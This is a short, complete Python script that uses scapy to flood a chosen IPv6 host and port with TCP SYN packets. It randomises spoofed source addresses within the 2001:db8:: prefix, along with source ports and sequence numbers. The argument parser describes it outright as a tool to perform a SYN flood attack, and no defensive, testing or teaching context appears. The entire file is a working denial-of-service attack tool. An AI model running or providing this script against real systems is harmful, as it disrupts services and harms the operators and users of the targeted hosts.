import random
import argparse
from scapy.all import *

def syn_flood(target_ip, target_port, num_sources, packets_per_source):
    # print(f"Starting SYN Flood attack on {target_ip}:{target_port} with {num_sources * packets_per_source} packets.")
    
    for _ in range(num_sources):
        src_ip = "2001:db8::" + ":".join(["{:x}".format(random.randint(0, 0xffff)) for _ in range(4)])
        for _ in range(packets_per_source):
            src_port = random.randint(1024, 65535)
            seq = random.randint(0, 0xFFFFFFFF)
            ack_seq = 0
            flags = 'S'  # SYN flag
            
            ipv6_header = IPv6(src=src_ip, dst=target_ip)
            tcp_header = TCP(sport=src_port, dport=target_port, seq=seq, ack=ack_seq, flags=flags)
            
            packet = ipv6_header / tcp_header
            send(packet, verbose=False)
    
    print("Attack completed.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Perform a SYN Flood attack on an IPv6 address.')
    parser.add_argument('target_ip', type=str, help='The target IPv6 address')
    parser.add_argument('target_port', type=int, help='The target port')
    parser.add_argument('num_sources', type=int, help='The number of source IP addresses to use')
    parser.add_argument('packets_per_source', type=int, help='The number of SYN packets to send from each source IP')

    args = parser.parse_args()

    target_ip = args.target_ip
    target_port = args.target_port
    num_sources = args.num_sources
    packets_per_source = args.packets_per_source

    syn_flood(target_ip, target_port, num_sources, packets_per_source)
